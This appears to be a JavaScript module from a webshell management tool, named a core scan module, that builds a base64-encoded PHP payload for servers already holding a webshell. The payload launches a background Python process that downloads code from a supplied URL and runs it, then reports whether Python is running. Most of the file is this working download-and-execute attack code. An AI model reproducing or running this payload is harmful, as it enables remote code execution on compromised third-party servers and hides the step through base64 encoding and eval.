/**
 * 核心扫描模块
 */

class Bugscan {
  constructor(opt, argv) {
    return new Promise((res, rej) => {
      // 初始化核心模块
      let core = new antSword['core'][opt['type']](opt);
      // 请求数据
      core.request({
        _: this.template[opt['type']](argv.url, argv.tasks)
      }).then(res)
      .catch((err)=>{
        rej(err);
      });
    });
  }

  get template() {
    return {
      php: (url, tasks) => {
        var funcode = `function execbg($cmd){if(substr(php_uname(),0,7)=="Windows"){$cmd=str_replace('python -c','pythonw -c',$cmd);pclose(popen("start /B ". $cmd, "r"));}else{exec($cmd." > /dev/null &");}}@execbg("python -c \\"exec(__import__('urllib2').urlopen('${url}').read())\\" -m ${tasks}");if(substr(php_uname(),0,7)=="Windows"){$cmd = "tasklist|findstr python";}else{$cmd="ps -A|grep python|grep -v grep";}@exec($cmd, $info);if($info){echo("1");}else{echo("0");}`
        var data = new Buffer(funcode).toString('base64');
        return `@eval(base64_decode("${data}"));`
      },
      asp: (url, tasks) => ``,
      aspx: (url, tasks) => ``
    }
  }

}

module.exports = Bugscan;
